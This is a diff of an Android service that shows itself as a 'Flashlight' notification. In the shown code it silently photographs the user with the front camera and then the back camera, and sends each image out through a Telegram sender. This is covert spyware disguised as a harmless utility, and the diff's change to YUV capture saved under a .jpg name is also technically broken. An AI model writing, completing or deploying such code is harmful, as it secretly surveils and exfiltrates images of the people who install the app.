@@ -24,16 +24,14 @@ public class CameraService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        NotificationChannel ch = new NotificationChannel("cam", "Flashlight",
-                NotificationManager.IMPORTANCE_LOW);
+        NotificationChannel ch = new NotificationChannel("cam", "Flashlight", NotificationManager.IMPORTANCE_LOW);
         getSystemService(NotificationManager.class).createNotificationChannel(ch);
         Notification n = new Notification.Builder(this, "cam")
-                .setContentTitle("Flashlight").setSmallIcon(android.R.drawable.ic_menu_camera)
-                .build();
+                .setContentTitle("Flashlight").setSmallIcon(android.R.drawable.ic_menu_camera).build();
         startForeground(1, n);
 
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-        capturePhoto("front", "1");
+        capturePhoto("front", "1"); // Сначала фронтальная
         return START_NOT_STICKY;
     }
 
@@ -42,16 +40,20 @@ public class CameraService extends Service {
             manager.openCamera(id, new CameraDevice.StateCallback() {
                 @Override public void onOpened(CameraDevice cam) {
                     device = cam;
-                    reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
+                    // Используем YUV_420_888, так как он поддерживается везде
+                    reader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 1);
                     reader.setOnImageAvailableListener(r -> {
                         Image img = r.acquireLatestImage();
                         ByteBuffer buf = img.getPlanes()[0].getBuffer();
                         byte[] data = new byte[buf.remaining()];
                         buf.get(data);
                         img.close();
+                        
                         new TelegramSender().send(data, tag + ".jpg");
+                        
                         r.close();
                         device.close();
+                        // После фронталки снимаем заднюю
                         if (tag.equals("front")) {
                             capturePhoto("back", "0");
                         } else {
